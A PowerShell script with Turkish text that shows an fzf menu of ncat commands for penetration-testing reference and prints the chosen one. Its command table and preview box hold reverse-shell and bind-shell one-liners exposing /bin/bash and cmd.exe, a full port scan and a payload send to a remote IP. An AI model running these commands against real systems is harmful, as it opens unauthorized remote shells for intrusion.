function Show-NcatMenu {
    # Ncat komutları ve açıklamaları
    $ncatCommands = @{
        "ncat -lvp 4444" = "Port 4444 üzerinde gelen bağlantıları dinler."
        "ncat -e /bin/bash 192.168.1.10 4444" = "Geri bağlantı (reverse shell) açar ve saldırganın terminaline bağlanır."
        "ncat -lvp 4444 -e cmd.exe" = "Windows sisteminde bir bind shell açar."
        "ncat -nv 192.168.1.10 4444" = "Belirtilen IP ve porta bağlantı kurar (TCP)."
        "ncat -lvu 4444" = "UDP bağlantılarını dinler."
        "ncat -u 192.168.1.10 4444" = "UDP üzerinden bağlantı kurar."
        "ncat -zv 192.168.1.10 1-65535" = "Hızlı bir port taraması yapar."
        "ncat --proxy 192.168.1.10:8080 -nv google.com 80" = "HTTP proxy üzerinden istek gönderir."
        "ncat --socks5 192.168.1.10 1080" = "SOCKS5 proxy olarak çalışır."
        "ncat -l 8888 --chat" = "Basit bir chat sunucusu oluşturur."
        "ncat -e /bin/bash --allow 192.168.1.100 -lvp 7777" = "Sadece belirli bir IP'ye açık bind shell açar."
        "ncat --send-only 192.168.1.10 4444 < payload.bin" = "Belirtilen IP'ye binary payload gönderir."
        "ncat -v 10.0.0.22 4444 --ssl" = "10.0.0.22 üzerindeki 4444 portuna SSL ile bağlanır."
        "ncat -exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl" = "Yalnızca 10.0.0.4 adresinden bağlanmayı kabul eder, bağlanan kişi için cmd.exe çalıştırır ve SSL şifrelemesi yapar."

    }

    # Menü için komutları hazırla
    $ncatList = $ncatCommands.GetEnumerator() | Sort-Object -Property Name | ForEach-Object {
        "$($_.Name) - `e[36m$($_.Value)`e[0m"
    }

    # Geçici dosya oluştur
    $tempFile = [System.IO.Path]::GetTempFileName()
    $ncatList | Set-Content -Path $tempFile

    # 🔥 Havali Ön İzleme İçeriği
    $previewFile = [System.IO.Path]::GetTempFileName()
    @"
`e[33m┌───────────────────────────────────────────────────┐`e[0m
`e[33m│`e[32m 🚀 Ncat: Ağ Bağlantılarının İsviçre Çakısı!            `e[33m│`e[0m
`e[33m├───────────────────────────────────────────────────┤`e[0m
`e[33m│`e[32m ✅ Protokol Desteği: TCP, UDP, TLS/SSL, Proxy, SOCKS5  `e[33m│`e[0m
`e[33m│`e[32m ✅ Kullanım Alanları:                                  `e[33m│`e[0m
`e[33m│`e[32m    🔹 Reverse Shell (Uzak Bağlantı Erişimi)           `e[33m│`e[0m
`e[33m│`e[32m    🔹 Bind Shell (Sisteme Erişim Açma)                `e[33m│`e[0m
`e[33m│`e[32m    🔹 Dosya Transferi                                 `e[33m│`e[0m
`e[33m│`e[32m    🔹 Port Taraması & Güvenlik Testleri              `e[33m│`e[0m
`e[33m├───────────────────────────────────────────────────┤`e[0m
`e[33m│`e[32m 🔥 Alternatifler: Netcat 🆚 Socat                    `e[33m│`e[0m
`e[33m│`e[32m    🛠️  Netcat: Eski ama güçlü                         `e[33m│`e[0m
`e[33m│`e[32m    🚀  Socat: Daha fazla özellik, daha fazla esneklik `e[33m│`e[0m
`e[33m├───────────────────────────────────────────────────┤`e[0m
`e[33m│`e[32m 💡 İpucu: En Güçlü Ncat Komutları!                  `e[33m│`e[0m
`e[33m│`e[32m    🔹 ncat -lvp 4444 -e /bin/bash                   `e[33m│`e[0m
`e[33m│`e[32m    🔹 ncat -zv 192.168.1.10 1-65535                 `e[33m│`e[0m
`e[33m│`e[32m    🔹 ncat --socks5 192.168.1.10 1080               `e[33m│`e[0m
`e[33m├───────────────────────────────────────────────────┤`e[0m
`e[33m│`e[32m ❓ Ncat Nedir?                                      `e[33m│`e[0m
`e[33m│`e[32m 🔹 Ncat, Netcat’in geliştirilmiş ve daha güvenli    `e[33m│`e[0m
`e[33m│`e[32m    bir versiyonudur.                                `e[33m│`e[0m
`e[33m│`e[32m 🔹 Nmap geliştiricileri tarafından yazılmıştır.     `e[33m│`e[0m
`e[33m│`e[32m 🔹 Gelişmiş şifreleme (TLS/SSL) ve proxy desteği    `e[33m│`e[0m
`e[33m│`e[32m    sayesinde güvenlik uzmanları tarafından tercih   `e[33m│`e[0m
`e[33m│`e[32m    edilmektedir.                                    `e[33m│`e[0m
`e[33m│`e[32m 🔹 Port tarama, veri transferi, shell erişimi gibi  `e[33m│`e[0m
`e[33m│`e[32m    çok yönlü ağ işlemlerinde kullanılır.            `e[33m│`e[0m
`e[33m└───────────────────────────────────────────────────┘`e[0m
"@ | Set-Content -Path $previewFile


    # fzf komutu (Ön izleme kısmı eklendi)
    $fzfCommand = "cat $tempFile | fzf --height 70% --layout=reverse --border --ansi --color=fg:#ffffff,bg:#1e1e2e,hl:#ff79c6,info:#8be9fd,pointer:#bd93f9,marker:#50fa7b,header:#ff5555,spinner:#f1fa8c --pointer='>' --marker='+' --prompt='Komut: ' --preview='cat $previewFile' --preview-window=right:50%"

    # Menüyü çalıştır
    $result = Invoke-Expression $fzfCommand

    # Geçici dosyaları temizle
    Remove-Item $tempFile
    Remove-Item $previewFile

    # Seçilen komutu ekrana yazdır
    if ($result) {
        $selectedCommandKey = $result.Split(" - ")[0]
        $selectedCommandDescription = $ncatCommands[$selectedCommandKey]
        Write-Output "`n`n`e[32mSeçilen Komut:`e[0m $selectedCommandKey`n`e[32mAçıklama:`e[0m $selectedCommandDescription"
    }
}

# Kısayol oluştur
Set-Alias -Name ncatmenu -Value Show-NcatMenu
